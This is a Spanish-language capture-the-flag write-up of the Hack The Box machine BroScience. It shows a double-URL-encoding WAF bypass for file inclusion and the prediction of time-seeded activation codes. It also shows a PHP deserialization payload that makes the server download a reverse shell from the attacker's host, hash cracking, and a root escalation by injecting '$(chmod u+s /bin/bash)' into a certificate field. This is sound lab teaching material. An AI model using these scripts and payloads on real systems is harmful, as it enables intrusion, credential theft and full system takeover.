---
 title: BroScience Writeup
 author: miguel3023
 date: 2023-01-9
 categories: [Writeup, HTB]
 tags: [Linux, CTF, Medium, LFI, Waf bypass, Deserialization Attack, Cron Job, Cracking Passwords]
 image:
   path: ../../assets/img/commons/Broscience/BroScience.png
   width: 800
   height: 450 
---

En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la base de datos para ver credenciales, crackear contraseñas y conectarnos por ssh. Por último abusaremos de un script que se está ejecutando a intervalos regulares de tiempo.

Primeramente ejecutamos un escaneo con nmap

```
❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.95.77 -oG OpenPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Scanning 10.129.95.77 [65535 ports]
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Vemos el puerto 80 y 443 abiertos, ahora lanzamos un whatweb para ver las tecnologías que se emplean en el puerto 80

```
❯ whatweb http://10.129.95.77
http://10.129.95.77 [301 Moved Permanently] Apache[2.4.54], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.95.77], RedirectLocation[https://broscience.htb/], Title[301 Moved Permanently]
https://broscience.htb/ [200 OK] Apache[2.4.54], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.95.77], Script, Title[BroScience : Home]
```

Vemos que hace un redirect a "broscience.htb", lo añadimos al "/etc/hosts". Si nos dirigimos a la web nos redirige hacia el "https" con el certificado SSL autofirmado.

Ahora escaneamos con nmap para ver la versión de los servicios que hay en los puertos abiertos

```
❯ nmap -sCV -p22,80,443 10.129.95.77 -oN services
Nmap scan report for broscience.htb (10.129.95.77)

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: BroScience : Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
```

Fuzzeamos con **Wfuzz** 

```
❯ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://broscience.htb/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000014:   200        146 L    510 W      9308 Ch     "https://broscience.htb/"
000000016:   301        9 L      28 W       319 Ch      "images"                 
000000638:   301        9 L      28 W       321 Ch      "includes"               
000000730:   301        9 L      28 W       319 Ch      "manual"                 
000001073:   301        9 L      28 W       323 Ch      "javascript"             
000001717:   301        9 L      28 W       319 Ch      "styles"
```
Vemos un "/includes" y dentro un "img.php", y cuando entramos vemos que nos dice **Error: Missing 'path' parameter.** Es decir, hay un parámetro "path", lo usamos a ver qué 

```
❯ curl -k 'https://broscience.htb/includes/img.php?path=../../../../../etc/passwd'
<b>Error:</b> Attack detected.
```

Vemos que detecta un ataque si intentamos un LFI, pero se puede bypassear con doble urlencode, para ello me haré un script de python

```python
#!/usr/bin/python3

import urllib.parse, os, pdb

injection = input("Qué archivo quieres visualizar? ")

injection = urllib.parse.quote_plus(injection)

injection = urllib.parse.quote_plus(injection) 

command = "curl -k 'https://broscience.htb/includes/img.php?path=" + injection + "'"



execute = os.system(command)

print(execute)
```
Ahora para visualizar un fichero simplemente lo introducimos

```
❯ ./lfi.py
Qué archivo quieres visualizar? ../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```
Ahora podemos visualizar el archivo de "db_connect.php" que hay en includes

```php
❯ ./lfi.py
Qué archivo quieres visualizar? ../includes/db_connect.php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

Ya tenemos las credenciales de la base de datos pero por ahora eso no nos interesa. Visualizamos el "utils.php" y lo guardamos en un fichero 

```
❯ ./lfi.py > utils.php
../includes/utils.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3060  100  3060    0     0   4533      0 --:--:-- --:--:-- --:--:--  4526
```

Ahora viendo el código, podemos ver cómo se genera el código de activación cuando intentamos crear un usuario

```php
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

También podemos ver un archivo "activate.php", si lo guardamos y lo visualizamos podemos ver que nos manda a un link cuando genera el código de activación 

```
❯ cat register.php | grep "activate"
 
 $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";

```

Vemos que genera un código de 32 dígitos y en base a la hora del sistema cuando tramitamos la petición de creación de usuario. Esto gracias a la función "srand" que funciona como semilla de hora. Creamos un usuario e interceptamos la petición con burpsuite. Ahora con un script de php podemos intentar fuzzear por los códigos aleatorios que nos genera el script 

```php
<?php
function generate_activation_code($time) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($time);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

$ref_time = date("U",strtotime('Mon, 09 Jan 2023 23:32:24 GMT'));
for ($t = $ref_time - 500; $t <= $ref_time + 500; $t++)
    echo generate_activation_code($t)."\n";
```

```
❯ wfuzz --hh=1256 -c -z file,codigos.php 'https://broscience.htb/activate.php?code=FUZZ'

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                      
=====================================================================

000000501:   200        27 L     65 W       1251 Ch     "9RLps9HakHqodR6BQGz3HcHux72To6ei"
```

Y listo, ya puedes iniciar sesión en la web. Ahora vemos la cookie "user-prefs" que vemos que está en base64, si lo decodificamos vemos lo siguiente

```
❯ echo "Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=" | base64 -d
O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
```

Si vemos en el script de "utils.php" vemos que las cookies son serializadas y el servidor la deserializa para interpretarla. Con esto ya sabemos que podemos efectuar un "deserialization Attack"

```
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```

Nos copiamos un script de [php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) de monkey pentester 

Ahora modificamos el "utils.php" al final del script para cargar un recurso de nuestra máquina al servidor


```php
class AvatarInterface {
    public $tmp = "http://10.10.16.68/shell.php";
    public $imgPath = "./shell.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

echo base64_encode(serialize(new AvatarInterface));

?>
```
Le damos permisos de ejecución y lo ejecutamos

```
❯ php utils.php
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE2LjY4L3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ==
```

Ahora cargamos ese base64 a las cookies, y recargamos la página

`Nota:` Ponemos los dos "==" url encodeados cuando los pongamos en la página antes de recargar

![Cookies]({{ 'assets/img/commons/Broscience/cookie.png' | relative_url }}){: .center-image }
_Cambiando Cookies_

Luego nos vamos a "https://broscience.htb/shell.php" para que se ejecute el scrip. Pero nos ponemos en escucha por el puerto 80 con python y en escucha con netcat por el puerto 443

```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.95.77 - - [09/Jan/2023 19:06:14] "GET /shell.php HTTP/1.0" 200 -
10.129.95.77 - - [09/Jan/2023 19:06:14] "GET /shell.php HTTP/1.0" 200 -
10.129.95.77 - - [09/Jan/2023 19:06:15] "GET /shell.php HTTP/1.0" 200 -
```

```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.68] from (UNKNOWN) [10.129.95.77] 37776
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
 19:06:17 up 19:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname -I
10.129.95.77 dead:beef::250:56ff:feb9:c1d3
```
Una vez hemos obtenido acceso, hay que cambiar de usuario. Para ello nos conectamos a la base de datos que se emplea. Si hacemos un "ps -faux" para ver las tareas que se están ejecutando, vemos un "postgress" ya con esto sabes que se emplea Postgress SQL

```
www-data@broscience:/$ psql -U dbuser -h localhost -W -d broscience 
Password: RangeOfMotion%777
```
Enumeramos las tablas que hay 

```
broscience=> \dt;
           List of relations
 Schema |   Name    | Type  |  Owner   
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres
(3 rows)

broscience=> 
```

Ahora vemos el contenido de la tabla users

```
broscience=> select * from users;
  
1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf |   
2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 |   
3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 |   
4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 |   
5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm |

```

Vemos los hashes, los copiamos y los rompemos con hashcat. Una cosa a tener en cuenta es que estos hashes necesitan del "salt" que esto es para que sea más complicado a un atacante romper los hashes, pero nosotros ya lo tenemos que lo encontramos en el archivo de "db_connect.php"

Ahora así nos quedan los hashes

```
❯ cat hashes

15657792073e8a843d4f91fc403454e1:NaCl
13edad4932da9dbb57d9cd15b66ed104:NaCl
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
a7eed23a7be6fe0d765197b1027453fe:NaCl
5d15340bded5b9395d5d14b9c21bc82b:NaCl
```

Ahora los rompemos 

```
❯ hashcat -m 20 hashes /usr/share/wordlists/rockyou.txt

  13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
  bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
  5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
```

Y nos conectamos por ssh

```
❯ ssh bill@broscience.htb
bill@broscience.htb's password: 
bill@broscience:~$ hostname -I
10.129.95.77 dead:beef::250:56ff:feb9:c1d3 
bill@broscience:~$ 
```

Nos pasamos pspy a la máquina victima y vemos que se está ejecutando un script de bash "/opt/renew_cert.sh". Si le echamos un vistazo vemos que ejecuta el siguiente comando 

```
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
```

También lo ejecutamos pero le modificamos algunas cosas. Y luego le inyectamos nuestro código cuando nos pregunte por el "CommonName"

```
bill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout test.key -out test.crt -days 1

Generating a RSA private key
.......................................++++
...................................................++++
writing new private key to 'test.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
Email Address []:
```

Esperamos un poco a que root ejecute el script y listo, podemos hacer "bash -p"

```
bill@broscience:~/Certs$ bash -p 
bash-5.1# whoami
root
bash-5.1#
```
